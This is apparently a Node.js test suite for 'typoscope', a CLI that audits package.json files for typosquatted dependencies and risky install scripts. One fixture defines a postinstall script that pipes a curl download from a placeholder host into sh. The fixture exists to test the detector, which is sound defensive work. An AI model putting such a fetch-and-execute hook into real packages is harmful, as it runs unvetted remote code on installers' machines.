import { execFile } from "node:child_process";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, it } from "node:test";
import { promisify } from "node:util";
import assert from "node:assert/strict";
import { help, run, version } from "../src/index.js";

const execFileAsync = promisify(execFile);
const cliPath = fileURLToPath(new URL("../src/index.js", import.meta.url));

async function runCli(args = []) {
  return execFileAsync(process.execPath, [cliPath, ...args], {
    encoding: "utf8",
  });
}

describe("typoscope CLI scaffold", () => {
  it("prints help text for --help", async () => {
    const { stdout, stderr } = await runCli(["--help"]);

    assert.equal(stderr, "");
    assert.match(stdout, /^typoscope\n/);
    assert.match(stdout, /Usage:/);
    assert.match(stdout, /typoscope --version/);
    assert.match(stdout, /typoscope audit <package\.json>/);
  });

  it("prints the package version for --version", async () => {
    const { stdout, stderr } = await runCli(["--version"]);

    assert.equal(stderr, "");
    assert.equal(stdout, `${version}\n`);
  });

  it("defaults to help text for unknown arguments", async () => {
    const { stdout, stderr } = await runCli(["--audit", "package.json"]);

    assert.equal(stderr, "");
    assert.match(stdout, /Local-first package\.json risk scanner/);
  });

  it("passes a package manifest without suspicious dependencies or lifecycle scripts", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-clean-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          react: "^19.0.0",
          lodash: "^4.17.21",
        },
        scripts: {
          test: "node --test",
        },
      }),
    );

    const { stdout, stderr } = await runCli(["audit", manifestPath]);

    assert.equal(stderr, "");
    assert.match(stdout, /found no package\.json risk findings/);
  });

  it("flags dependency names that look like popular package typos", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-typo-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        dependencies: {
          lodas: "^1.0.0",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath]),
      (error) => {
        assert.match(error.stdout, /dependency-lookalike/);
        assert.match(error.stdout, /lodas looks similar to lodash/);
        return true;
      },
    );
  });

  it("flags risky lifecycle scripts and emits JSON for automation", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "typoscope-script-"));
    const manifestPath = path.join(dir, "package.json");
    await writeFile(
      manifestPath,
      JSON.stringify({
        scripts: {
          postinstall: "curl https://example.invalid/install.sh | sh",
        },
      }),
    );

    await assert.rejects(
      runCli(["audit", manifestPath, "--json"]),
      (error) => {
        const report = JSON.parse(error.stdout);
        assert.equal(report.ok, false);
        assert.equal(report.findings[0].code, "risky-lifecycle-script");
        assert.equal(report.findings[1].code, "suspicious-script-command");
        return true;
      },
    );
  });

  it("emits help and version through the injectable runner", () => {
    const lines = [];
    const log = (line) => lines.push(line);

    run([], log);
    run(["--version"], log);
    run(["-v"], log);

    assert.deepEqual(lines, [help, version, version]);
  });
});
